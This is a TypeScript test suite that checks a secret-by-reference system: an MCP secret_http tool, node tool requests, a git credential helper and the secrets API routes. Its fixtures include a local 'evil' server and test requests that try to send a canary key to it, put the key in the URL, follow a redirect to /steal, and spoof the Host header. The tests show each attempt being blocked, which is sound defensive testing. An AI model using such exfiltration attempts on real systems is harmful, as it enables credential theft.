/**
 * Saved secrets used by reference on the computer (B12, docs/35 §8.7): `secret_http` through a run's
 * `ensemble` MCP server (as the agent starts it) and through a node's `node.tool.request`, and the git
 * credential helper with real git. The secret reaches only the destinations its owner allowed, never
 * comes back in an answer (as written or encoded), never sits in a run's environment, and git gets it
 * only for an allowed host, in a run that may use it, while that run goes on.
 */
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { randomBytes } from "node:crypto";
import { mkdirSync, mkdtempSync, rmSync } from "node:fs";
import { createServer, type IncomingMessage, type Server } from "node:http";
import { homedir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import test, { after } from "node:test";


const scratch = mkdtempSync(join(homedir(), ".ensemble-by-reference-"));
process.env.ENSEMBLE_REMOTE_STATE_DIR = join(scratch, "data");
process.env.ENSEMBLE_WORKSPACE_ROOT = join(scratch, "workspace");
process.env.ENSEMBLE_SECRET_KEY = randomBytes(32).toString("base64");
const { createHttpHarness } = await import("../test/http.js");
const h = await createHttpHarness();
const { registerEngineRun, unregisterEngineRun, setLocalPort } = await import("../workspace/engines/registry.js");
const { saveRunSecret, setSecretAllow } = await import("../lib/run-secrets.js");
const { updateSettings } = await import("../remote/store.js");
const { runCredentials } = await import("./run-env.js");
const { gitCredentialEnv, forgetGitRunsForTests } = await import("./git-credential.js");
const { nodeToolAnswerFor } = await import("../device-tools/answer.js");
const { NodeToolRequest } = await import("../remote/contract.js");
const { env } = await import("../config.js");

/** A web API that answers with everything it was sent, as written and encoded, so a leak would show. */
const seen: Array<{ url: string; headers: IncomingMessage["headers"]; body: string }> = [];
const api = createServer((req, res) => {
  let body = "";
  req.on("data", (chunk) => (body += chunk));
  req.on("end", () => {
    seen.push({ url: req.url ?? "", headers: req.headers, body });
    if (req.url === "/redirect") {
      res.writeHead(302, { location: `http://127.0.0.1:${port(evil)}/steal` }).end();
      return;
    }
    const auth = String(req.headers.authorization ?? "");
    res.writeHead(200, { "content-type": "application/json", "set-cookie": "session=abc" });
    res.end(JSON.stringify({ auth, base64: Buffer.from(auth).toString("base64"), encoded: encodeURIComponent(auth), body, headers: req.headers }));
  });
});
/** Somewhere a secret must never go. */
const stolen: string[] = [];
const evil = createServer((req, res) => {
  stolen.push(`${req.method} ${req.url} ${JSON.stringify(req.headers)}`);
  res.end("thanks");
});
const port = (server: Server) => (server.address() as { port: number }).port;
await new Promise<void>((resolve) => api.listen(0, "127.0.0.1", resolve));
await new Promise<void>((resolve) => evil.listen(0, "127.0.0.1", resolve));
const API = `http://127.0.0.1:${port(api)}`;
const EVIL = `http://127.0.0.1:${port(evil)}`;

process.env.ENSEMBLE_DESKTOP = "1";
await h.app.listen({ port: 0, host: "127.0.0.1" });
const ENGINE = `http://127.0.0.1:${port(h.app.server)}`;
setLocalPort(port(h.app.server));

after(async () => {
  await h.close();
  api.close();
  evil.close();
  rmSync(scratch, { recursive: true, force: true });
});

const CANARY = `sk_live_REFCANARY_${randomBytes(12).toString("hex")}`;
const shapes = (value: string) => [value, Buffer.from(value).toString("base64"), Buffer.from(value).toString("base64url"), encodeURIComponent(value), Buffer.from(`Bearer ${value}`).toString("base64"), encodeURIComponent(`Bearer ${value}`)];
const leaks = (text: string) => shapes(CANARY).filter((shape) => text.includes(shape));

async function runFor(userId: string, context: Record<string, unknown> = {}, extra: { network?: boolean; status?: string } = {}) {
  const task = await h.prisma.task.create({ data: { userId, title: "Charge a test card" } });
  const job = await h.prisma.workspaceJob.create({ data: { userId, taskId: task.id, executionMode: "native", model: "default", status: extra.status ?? "running", context: context as never } });
  const ctx = { prisma: h.prisma, job, userId, taskId: task.id, root: scratch, sandboxed: false, network: extra.network ?? true, signal: new AbortController().signal, accessMode: "read-write", trusted: true, explicitTrust: false, silentWorkspace: true, blockedOutside: [], touched: new Set<string>(), event: async () => undefined, progress: async () => undefined, waitForPerson: async <T>(work: () => Promise<T>) => work(), strength: "advisory" };
  return { job, credential: registerEngineRun(ctx as never) };
}

/** The run's MCP server as the agent starts it, answering one call. */
async function mcpCall(credential: string, args: Record<string, unknown>): Promise<{ text: string; isError: boolean }> {
  const script = fileURLToPath(new URL("../../../../scripts/ensemble-ask-mcp.mjs", import.meta.url));
  const child = spawn(process.execPath, [script], { env: { ...process.env, ENSEMBLE_ENGINE_URL: ENGINE, ENSEMBLE_RUN: credential }, stdio: ["pipe", "pipe", "inherit"] });
  try {
    let out = "";
    const answered = new Promise<{ text: string; isError: boolean }>((resolve) => {
      child.stdout.on("data", (chunk: Buffer) => {
        out += chunk.toString();
        const line = out.split("\n").find((row) => row.includes('"id":7'));
        if (!line) return;
        const reply = JSON.parse(line) as { result: { content: Array<{ text: string }>; isError?: boolean } };
        resolve({ text: reply.result.content[0]!.text, isError: reply.result.isError === true });
      });
    });
    child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", id: 7, method: "tools/call", params: { name: "secret_http", arguments: args } })}\n`);
    return await answered;
  } finally {
    child.kill();
  }
}

test("secret_http from a coding agent: the value reaches only the allowed API and never comes back", async () => {
  const user = await h.asUser();
  await saveRunSecret(h.prisma, user.id, "ECHO_KEY", CANARY, { allow: [API] });
  await saveRunSecret(h.prisma, user.id, "PLAIN_KEY", "plain-env-value");
  const { job, credential } = await runFor(user.id);
  try {
    const call = { ref: "ECHO_KEY", url: `${API}/v1/charges`, method: "POST", headers: { Authorization: "Bearer {{ECHO_KEY}}", "X-Copy": "{{ECHO_KEY}}" }, body: JSON.stringify({ key: "{{ECHO_KEY}}" }) };
    const answer = await mcpCall(credential, call);
    assert.equal(answer.isError, false, answer.text);
    assert.equal(seen.at(-1)!.headers.authorization, `Bearer ${CANARY}`, "the API got the real value");
    assert.equal(JSON.parse(seen.at(-1)!.body).key, CANARY);
    assert.match(answer.text, /^HTTP 200 from http:\/\/127\.0\.0\.1:\d+\/v1\/charges/);
    assert.match(answer.text, /Bearer \[ECHO_KEY\]/);
    assert.deepEqual(leaks(answer.text), [], "not as written, base64, base64url or URL-encoded");
    assert.ok(!/set-cookie/i.test(answer.text), "cookies are not passed on");

    const refused = async (args: Record<string, unknown>, why: RegExp, cred = credential) => {
      const result = await mcpCall(cred, { ...call, ...args });
      assert.equal(result.isError, true, result.text);
      assert.match(result.text, why);
      assert.deepEqual(leaks(result.text), []);
    };
    await refused({ url: `${EVIL}/collect` }, /ECHO_KEY may only be sent to http:\/\/127\.0\.0\.1:\d+; http:\/\/127\.0\.0\.1:\d+ is not allowed/);
    await refused({ url: `${API}/v1?key={{ECHO_KEY}}` }, /never in the address/);
    await refused({ url: `${API}/v1?key=%7B%7BECHO_KEY%7D%7D` }, /never in the address/);
    await refused({ headers: { Authorization: "Bearer nothing" }, body: undefined }, /Put \{\{ECHO_KEY\}\} where the value goes/);
    await refused({ ref: "PLAIN_KEY", headers: { Authorization: "Bearer {{PLAIN_KEY}}" }, body: undefined }, /no allowed destinations.*ensemble secrets allow PLAIN_KEY/);
    await refused({ ref: "NOT_SAVED", headers: { Authorization: "Bearer {{NOT_SAVED}}" }, body: undefined }, /not saved on this computer/);
    await refused({ headers: { Host: "evil.example", Authorization: "Bearer {{ECHO_KEY}}" } }, /set by the request itself/);

    // A redirect is not followed: the secret never goes on to wherever it points.
    const redirect = await mcpCall(credential, { ...call, url: `${API}/redirect` });
    assert.equal(redirect.isError, false, redirect.text);
    assert.match(redirect.text, /^HTTP 302/);
    assert.match(redirect.text, /redirect is not followed/);
    assert.equal(stolen.length, 0, "nothing reached a destination the owner did not allow");

    const ledger = JSON.stringify(await h.prisma.auditLedger.findMany({ where: { userId: user.id, action: "secret.use" } }));
    assert.match(ledger, /"name":"ECHO_KEY"/);
    assert.deepEqual(leaks(ledger), [], "the ledger names the secret and origin, never the value");
  } finally {
    unregisterEngineRun(job.id);
  }
});

test("a run uses only the secrets its scope allows, never with the internet off; reference secrets stay out of every environment", async () => {
  const user = await h.asUser();
  await saveRunSecret(h.prisma, user.id, "ECHO_KEY", CANARY, { allow: [API] });
  await saveRunSecret(h.prisma, user.id, "PLAIN_KEY", "plain-env-value");
  const call = { ref: "ECHO_KEY", url: `${API}/v1/me`, headers: { Authorization: "Bearer {{ECHO_KEY}}" } };
  const other = await runFor(user.id, { secrets: ["PLAIN_KEY"] });
  const offline = await runFor(user.id, {}, { network: false });
  try {
    assert.match((await mcpCall(other.credential, call)).text, /may not use ECHO_KEY/);
    assert.match((await mcpCall(offline.credential, call)).text, /internet is off/);
  } finally {
    unregisterEngineRun(other.job.id);
    unregisterEngineRun(offline.job.id);
  }

  // Compatibility mode (the default): a run that names nothing gets every environment secret, and reference secrets by name only.
  const all = await runCredentials(h.prisma, user.id, { id: "job-all", context: {} });
  assert.equal(all.env.PLAIN_KEY, "plain-env-value");
  assert.equal(all.env.ECHO_KEY, undefined, "a reference secret is never in an environment");
  assert.ok(!Object.values(all.env).some((value) => value.includes(CANARY)));
  assert.deepEqual(all.references, [{ name: "ECHO_KEY", allow: [API] }]);

  // Named mode: a run that names nothing gets nothing; one that names a secret gets that one.
  updateSettings({ secretsMode: "named" });
  try {
    const none = await runCredentials(h.prisma, user.id, { id: "job-none", context: {} });
    assert.deepEqual(none, { env: {}, references: [] });
    const named = await runFor(user.id, { secrets: ["ECHO_KEY"] });
    const unnamed = await runFor(user.id, {});
    try {
      assert.equal((await mcpCall(named.credential, call)).isError, false);
      assert.match((await mcpCall(unnamed.credential, call)).text, /may not use ECHO_KEY/);
    } finally {
      unregisterEngineRun(named.job.id);
      unregisterEngineRun(unnamed.job.id);
    }
  } finally {
    updateSettings({ secretsMode: "all" });
  }

  // Allowing a destination makes an environment secret a reference secret; clearing it turns it back.
  await setSecretAllow(h.prisma, user.id, "PLAIN_KEY", [API]);
  assert.equal((await runCredentials(h.prisma, user.id, { id: "job-x", context: {} })).env.PLAIN_KEY, undefined);
  await setSecretAllow(h.prisma, user.id, "PLAIN_KEY", []);
  assert.equal((await runCredentials(h.prisma, user.id, { id: "job-y", context: {} })).env.PLAIN_KEY, "plain-env-value");
  await assert.rejects(setSecretAllow(h.prisma, user.id, "PLAIN_KEY", ["http://example.com"]), /not https/);
  await assert.rejects(setSecretAllow(h.prisma, user.id, "PLAIN_KEY", ["https://api.example.com/v1"]), /origin only/);
});

test("secret_http from a node on this computer: allowed destinations only, the value hidden in the answer", async () => {
  await saveRunSecret(h.prisma, env.ENSEMBLE_DEV_USER_ID, "NODE_ECHO_KEY", CANARY, { allow: [API] });
  const ask = async (url: string) => {
    let reply: { status: number; body: unknown } | null = null;
    const request = NodeToolRequest.parse({ id: randomBytes(4).toString("hex"), nodeId: "node-1", mission: "conversation:r:private", attended: true, tool: "secret_http", ref: "NODE_ECHO_KEY", url, method: "GET", headers: { Authorization: "Bearer {{NODE_ECHO_KEY}}" } });
    await nodeToolAnswerFor(h.app, {} as never, request, async (answer) => void (reply = answer));
    return reply!;
  };
  const ok = await ask(`${API}/node`);
  assert.equal(ok.status, 200, JSON.stringify(ok));
  assert.equal(seen.at(-1)!.headers.authorization, `Bearer ${CANARY}`);
  assert.deepEqual(leaks(JSON.stringify(ok)), []);
  assert.match(JSON.stringify(ok), /Bearer \[NODE_ECHO_KEY\]/);
  const refused = await ask(`${EVIL}/node`);
  assert.equal(refused.status, 403);
  assert.match(JSON.stringify(refused.body), /may only be sent to/);
  assert.equal(stolen.length, 0);
});

test("git signs in with a reference secret only for its allowed host, in a run that may use it, while that run goes on", async () => {
  const user = await h.asUser();
  const TOKEN = `ghp_${randomBytes(18).toString("hex")}`;
  await saveRunSecret(h.prisma, user.id, "REPO_TOKEN", TOKEN, { allow: ["https://github.com"] });
  const home = join(scratch, "git-home");
  mkdirSync(home, { recursive: true });
  // git runs the helper, which asks this process's API: so git must not block this process (no spawnSync).
  const fill = (gitEnv: Record<string, string>, host: string) =>
    new Promise<{ status: number | null; stdout: string; stderr: string }>((resolve) => {
      const child = spawn("git", ["credential", "fill"], {
        env: { PATH: process.env.PATH, HOME: home, GIT_CONFIG_NOSYSTEM: "1", GIT_CONFIG_GLOBAL: join(home, "none"), GIT_TERMINAL_PROMPT: "0", GIT_ASKPASS: "/bin/false", SSH_ASKPASS: "/bin/false", ...gitEnv },
      });
      let stdout = "";
      let stderr = "";
      child.stdout.on("data", (chunk: Buffer) => (stdout += chunk.toString()));
      child.stderr.on("data", (chunk: Buffer) => (stderr += chunk.toString()));
      child.on("close", (status) => resolve({ status, stdout, stderr }));
      child.stdin.end(`protocol=https\nhost=${host}\n\n`);
    });
  const { job } = await runFor(user.id, { secrets: ["REPO_TOKEN"] });
  const gitEnv = await gitCredentialEnv(h.prisma, { jobId: job.id, userId: user.id }, ["REPO_TOKEN"], ENGINE);
  assert.ok(Number(gitEnv.GIT_CONFIG_COUNT) > 0);
  assert.ok(!JSON.stringify(gitEnv).includes(TOKEN), "the token is not in the run's environment");
  assert.match(gitEnv.GIT_CONFIG_KEY_0!, /^credential\.https:\/\/github\.com\.helper$/);

  const got = await fill(gitEnv, "github.com");
  assert.equal(got.status, 0, got.stderr);
  assert.match(got.stdout, new RegExp(`password=${TOKEN}`), "git gets it for the allowed host");
  const elsewhere = await fill(gitEnv, "gitlab.com");
  assert.ok(!elsewhere.stdout.includes(TOKEN), "and nowhere else");

  // A run that does not name it gets no git settings at all, nor one that names nothing (compatibility mode); a wrong token gets nothing.
  assert.deepEqual(await gitCredentialEnv(h.prisma, { jobId: job.id, userId: user.id }, ["OTHER_TOKEN"], ENGINE), {});
  assert.deepEqual(await gitCredentialEnv(h.prisma, { jobId: job.id, userId: user.id }, "all", ENGINE), {});
  const forged = Object.fromEntries(Object.entries(gitEnv).map(([key, value]) => [key, value.replace(/x-ensemble-git: [A-Za-z0-9_-]+/, "x-ensemble-git: forged")]));
  assert.ok(!(await fill(forged, "github.com")).stdout.includes(TOKEN));

  // The run ends: its token stops working.
  await h.prisma.workspaceJob.update({ where: { id: job.id }, data: { status: "succeeded" } });
  assert.ok(!(await fill(gitEnv, "github.com")).stdout.includes(TOKEN));
  const uses = await h.prisma.auditLedger.findMany({ where: { userId: user.id, action: "secret.use" } });
  assert.equal(uses.length, 1, "one use, in the ledger");
  assert.ok(!JSON.stringify(uses).includes(TOKEN));
  forgetGitRunsForTests();
});



test("the computer's own routes for `ensemble secrets`: destinations, the mode and the key's fingerprint, values never out", async () => {
  const user = await h.asUser();
  const put = await user.inject({ method: "PUT", url: "/api/run-secrets/CLI_KEY", payload: { value: CANARY, allow: [API] } });
  assert.equal(put.statusCode, 200, put.body);
  assert.deepEqual(put.json().allow, [API]);
  const listed = await user.inject({ method: "GET", url: "/api/run-secrets" });
  assert.deepEqual(listed.json().secrets.find((row: { name: string }) => row.name === "CLI_KEY").allow, [API]);
  assert.equal(listed.json().mode, "all");
  assert.deepEqual(leaks(listed.body), [], "names and destinations only");
  assert.equal((await user.inject({ method: "PUT", url: "/api/run-secrets/CLI_KEY/allow", payload: { allow: ["http://example.com"] } })).statusCode, 400);
  assert.deepEqual((await user.inject({ method: "PUT", url: "/api/run-secrets/CLI_KEY/allow", payload: { allow: [] } })).json().allow, []);
  assert.equal((await user.inject({ method: "PUT", url: "/api/run-secrets/NOPE/allow", payload: { allow: [API] } })).statusCode, 404);
  assert.equal((await user.inject({ method: "PUT", url: "/api/run-secrets/mode", payload: { mode: "named" } })).json().mode, "named");
  assert.equal((await user.inject({ method: "GET", url: "/api/run-secrets/mode" })).json().mode, "named");
  assert.equal((await user.inject({ method: "PUT", url: "/api/run-secrets/mode", payload: { mode: "all" } })).json().mode, "all");
  const key = (await user.inject({ method: "GET", url: "/api/run-secrets/key" })).json();
  assert.equal(key.paired, false);
  assert.equal(key.sealKey, null, "an unpaired computer has no key to show");
  // The web refuses all of it: secrets are kept only on a computer.
  process.env.ENSEMBLE_DESKTOP = "0";
  try {
    assert.equal((await user.inject({ method: "GET", url: "/api/run-secrets/key" })).statusCode, 409);
  } finally {
    process.env.ENSEMBLE_DESKTOP = "1";
  }
});
